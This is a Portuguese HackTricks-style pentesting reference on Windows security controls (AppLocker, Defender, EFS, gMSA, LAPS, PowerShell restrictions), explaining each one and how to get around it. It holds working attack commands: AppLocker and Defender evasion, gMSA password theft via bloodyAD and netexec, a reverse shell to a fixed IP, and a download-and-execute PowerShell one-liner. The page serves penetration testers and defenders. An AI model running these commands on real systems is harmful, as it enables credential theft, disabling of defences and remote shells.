# Controles de Segurança do Windows

{{#include ../../banners/hacktricks-training.md}}

## Política do AppLocker

Uma lista de permissões de aplicações é uma lista de aplicações de software aprovadas ou executáveis que são permitidos estar presentes e executar em um sistema. O objetivo é proteger o ambiente de malware prejudicial e software não aprovado que não esteja alinhado com as necessidades de negócio específicas de uma organização.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) é a **solução de whitelist de aplicações** da Microsoft e dá aos administradores do sistema controle sobre **quais aplicações e ficheiros os utilizadores podem executar**. Fornece **controlo granular** sobre executáveis, scripts, arquivos de instalação do Windows, DLLs, packaged apps e packed app installers.\
É comum que organizações **bloqueiem cmd.exe e PowerShell.exe** e o acesso de escrita a certos diretórios, **mas tudo isso pode ser contornado**.

### Verificar

Verifique quais arquivos/extensões estão bloqueados/permitidos:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Este caminho do registro contém as configurações e políticas aplicadas pelo AppLocker, oferecendo uma maneira de revisar o conjunto atual de regras aplicadas no sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Useful **Writable folders** to bypass AppLocker Policy: Se o AppLocker está permitindo executar qualquer coisa dentro de `C:\Windows\System32` ou `C:\Windows`, existem **writable folders** que você pode usar para **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Frequentemente **confiados** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries também podem ser úteis para contornar o AppLocker.
- **Regras mal escritas também podem ser contornadas**
- Por exemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, você pode criar uma **pasta chamada `allowed`** em qualquer lugar e ela será permitida.
- Organizações frequentemente focam em **bloquear o executável `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mas esquecem das **outras** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
- A **aplicação de DLLs raramente é ativada** devido à carga adicional que pode impor ao sistema e à quantidade de testes necessários para garantir que nada quebre. Então usar **DLLs como backdoors ajudará a contornar o AppLocker**.
- Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar PowerShell** code em qualquer processo e contornar o AppLocker. Para mais informações veja: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Armazenamento de Credenciais

### Security Accounts Manager (SAM)

Credenciais locais estão presentes neste arquivo; as senhas estão hashed.

### Local Security Authority (LSA) - LSASS

As **credenciais** (hashed) são **armazenadas** na **memória** deste subsistema por motivos de Single Sign-On.\
A **LSA** administra a **política de segurança** local (política de senhas, permissões de usuários...), **autenticação**, **tokens de acesso**...\
A LSA será responsável por **verificar** as credenciais fornecidas dentro do arquivo **SAM** (para um login local) e **comunicar-se** com o **domain controller** para autenticar um usuário do domínio.

As **credenciais** são **armazenadas** dentro do **processo LSASS**: Kerberos tickets, hashes NT e LM, senhas facilmente descriptografáveis.

### LSA secrets

A LSA pode salvar em disco algumas credenciais:

- Senha da conta do computador do Active Directory (quando o domain controller não estiver acessível).
- Senhas das contas de serviços do Windows
- Senhas de tarefas agendadas
- Mais (senha de aplicações IIS...)

### NTDS.dit

É o banco de dados do Active Directory. Está presente apenas em Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) é um antivírus disponível no Windows 10 e Windows 11, e em versões do Windows Server. Ele **bloqueia** ferramentas comuns de pentesting como **`WinPEAS`**. No entanto, existem formas de **contornar essas proteções**.

### Check

Para verificar o **status** do **Defender** você pode executar o cmdlet PS **`Get-MpComputerStatus`** (verifique o valor de **`RealTimeProtectionEnabled`** para saber se está ativo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerá-lo você também pode executar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS protege arquivos por meio de criptografia, utilizando uma chave **simétrica** conhecida como **File Encryption Key (FEK)**. Essa chave é criptografada com a **public key** do usuário e armazenada dentro do fluxo de dados alternativo $EFS do arquivo criptografado. Quando é necessária a descriptografia, a **private key** correspondente ao certificado digital do usuário é usada para descriptografar o FEK a partir do stream $EFS. Mais detalhes podem ser encontrados [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Cenários de descriptografia sem a ação do usuário** incluem:

- Quando arquivos ou pastas são movidos para um sistema de arquivos não-EFS, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), eles são automaticamente descriptografados.
- Arquivos criptografados enviados pela rede via protocolo SMB/CIFS são descriptografados antes da transmissão.

Esse método de criptografia permite **acesso transparente** aos arquivos criptografados para o proprietário. No entanto, simplesmente alterar a senha do proprietário e fazer login não permitirá a descriptografia.

**Pontos-chave**:

- EFS usa um FEK simétrico, criptografado com a public key do usuário.
- A descriptografia utiliza a private key do usuário para acessar o FEK.
- A descriptografia automática ocorre sob condições específicas, como cópia para FAT32 ou transmissão pela rede.
- Arquivos criptografados são acessíveis ao proprietário sem passos adicionais.

### Check EFS info

Verifique se um **user** utilizou esse **service** checando se este caminho existe: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Verifique **who** tem **access** ao arquivo usando cipher /c \<file>\
Você também pode usar `cipher /e` e `cipher /d` dentro de uma pasta para **encrypt** e **decrypt** todos os arquivos

### Decrypting EFS files

#### Obter privilégios System

Essa forma requer que o **victim user** esteja **running** um **process** dentro do host. Se esse for o caso, usando uma sessão `meterpreter` você pode impersonate o token do processo do usuário (`impersonate_token` do `incognito`). Ou você pode simplesmente `migrate` para o processo do usuário.

#### Knowing the users password


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

A Microsoft desenvolveu **Group Managed Service Accounts (gMSA)** para simplificar o gerenciamento de service accounts em infraestruturas de TI. Diferente de service accounts tradicionais que frequentemente têm a opção "**Password never expire**" habilitada, gMSAs oferecem uma solução mais segura e gerenciável:

- **Automatic Password Management**: gMSAs usam uma senha complexa de 240 caracteres que muda automaticamente de acordo com a política de domínio ou computador. Esse processo é gerenciado pelo Key Distribution Service (KDC) da Microsoft, eliminando a necessidade de atualizações manuais de senha.
- **Enhanced Security**: Essas contas são imunes a lockouts e não podem ser usadas para interactive logins, aumentando sua segurança.
- **Multiple Host Support**: gMSAs podem ser compartilhadas entre múltiplos hosts, tornando-as ideais para serviços rodando em vários servidores.
- **Scheduled Task Capability**: Diferente de managed service accounts, gMSAs suportam a execução de scheduled tasks.
- **Simplified SPN Management**: O sistema atualiza automaticamente o Service Principal Name (SPN) quando há alterações nos detalhes sAMaccount do computador ou no nome DNS, simplificando o gerenciamento de SPN.

As senhas para gMSAs são armazenadas na propriedade LDAP _**msDS-ManagedPassword**_ e são automaticamente resetadas a cada 30 dias pelos Domain Controllers (DCs). Essa senha, um blob de dados criptografado conhecido como [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), só pode ser recuperada por administradores autorizados e pelos servidores onde as gMSAs estão instaladas, garantindo um ambiente seguro. Para acessar essa informação, uma conexão segura como LDAPS é necessária, ou a conexão deve estar autenticada com 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Você pode ler essa senha com [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Encontre mais informações neste post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Além disso, confira esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre como realizar um **NTLM relay attack** para **ler** a **senha** do **gMSA**.

### Abusando de ACL chaining para ler a senha gerenciada do gMSA (GenericAll -> ReadGMSAPassword)

Em muitos ambientes, usuários com poucos privilégios podem pivotar para segredos do gMSA sem comprometer o DC abusando de ACLs de objetos mal configuradas:

- Um grupo que você pode controlar (por exemplo, via GenericAll/GenericWrite) recebe `ReadGMSAPassword` sobre um gMSA.
- Ao adicionar-se a esse grupo, você herda o direito de ler o blob `msDS-ManagedPassword` do gMSA via LDAP e derivar credenciais NTLM utilizáveis.

Fluxo de trabalho típico:

1) Descubra o caminho com BloodHound e marque seus foothold principals como Owned. Procure por arestas como:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Adicione-se ao grupo intermediário que você controla (exemplo com bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Leia a senha gerenciada do gMSA via LDAP e derive o hash NTLM. NetExec automatiza a extração de `msDS-ManagedPassword` e a conversão para NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Autentique-se como o gMSA usando o hash NTLM (não é necessário plaintext). Se a conta estiver em Remote Management Users, o WinRM funcionará diretamente:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notas:
- Leituras LDAP de `msDS-ManagedPassword` exigem sealing (p.ex., LDAPS/sign+seal). Ferramentas tratam isso automaticamente.
- gMSAs frequentemente recebem direitos locais como WinRM; verifique a associação a grupos (p.ex., Remote Management Users) para planejar lateral movement.
- Se você só precisa do blob para calcular o NTLM por conta própria, consulte a estrutura MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

A **Local Administrator Password Solution (LAPS)**, disponível para download em [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permite o gerenciamento de senhas do Administrador local. Essas senhas, que são **aleatórias**, únicas e **alteradas regularmente**, são armazenadas centralmente no Active Directory. O acesso a essas senhas é restrito através de ACLs a usuários autorizados. Com permissões suficientes concedidas, é possível ler as senhas do administrador local.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloqueia muitas das funcionalidades** necessárias para usar o PowerShell de forma eficaz, como bloquear objetos COM, permitir apenas tipos .NET aprovados, fluxos de trabalho baseados em XAML, classes do PowerShell e muito mais.

### **Verificar**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Evasão
```bash
#Easy bypass
Powershell -version 2
```
No Windows atual esse Bypass não funciona, mas você pode usar[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilá-lo você pode precisar** **de** _**Adicionar uma Referência**_ -> _Procurar_ ->_Procurar_ -> adicionar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **mudar o projeto para .Net4.5**.

#### Bypass direto:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o constrained mode. Para mais informações, veja: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Polícia de Execução do PS

Por padrão está definido como **restricted.** Principais formas de contornar essa política:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interface de Provedor de Suporte de Segurança (SSPI)

É a API que pode ser usada para autenticar usuários.

O SSPI ficará encarregado de encontrar o protocolo adequado para duas máquinas que queiram se comunicar. O método preferido para isso é Kerberos. Em seguida, o SSPI negociará qual protocolo de autenticação será usado; esses protocolos de autenticação são chamados Provedores de Suporte de Segurança (SSP), estão presentes em cada máquina Windows na forma de uma DLL e ambas as máquinas devem suportar o mesmo para poderem se comunicar.

### Principais SSPs

- **Kerberos**: O preferido
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Por razões de compatibilidade
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Servidores web e LDAP, senha em forma de hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: É usado para negociar o protocolo a ser usado (Kerberos ou NTLM, sendo Kerberos o padrão)
- %windir%\Windows\System32\lsasrv.dll

#### A negociação pode oferecer vários métodos ou apenas um.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que habilita uma **solicitação de consentimento para atividades elevadas**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Referências

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
